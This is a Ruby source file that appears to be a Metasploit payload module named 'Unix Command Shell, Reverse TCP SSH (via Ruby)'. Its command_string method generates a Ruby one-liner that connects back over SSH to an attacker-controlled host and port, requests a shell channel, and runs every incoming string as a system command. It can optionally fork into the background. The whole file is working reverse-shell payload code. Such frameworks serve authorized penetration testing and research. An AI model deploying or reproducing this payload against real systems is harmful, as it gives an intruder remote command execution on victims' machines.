##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_ssh'
require 'msf/base/sessions/ssh_command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 1024

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP SSH (via Ruby)',
      'Description' => 'Connect back and create a command shell via Ruby, uses SSH',
      'Author'      => 'RageLtMan',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseSsh,
      'Session'     => Msf::Sessions::SshCommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'ruby',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_advanced_options(
      [
        Msf::OptBool.new('PrependFork', [ false, "Start the payload in its own process via fork", true ])
      ]
    )
  end

  def generate
    vprint_good(command_string)
    return super + command_string
  end

  def command_string
    lhost = datastore['LHOST']
    lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
    frk   = datastore['PrependFork'] ? 'exit if fork;' : ''
    res = "ruby -rnet/ssh -e '#{frk}Net::SSH.start(\"#{lhost}\",#{datastore['LPORT']},paranoid:false)"
    res << '{|s|s.open_channel{|c|c.request_pty{|a|a.send_channel_request("shell")};'
    res << 'c.on_data{|a,d|begin;c.send_data(`#{d}`);rescue;end}};s.loop}\''

    return res
  end
end
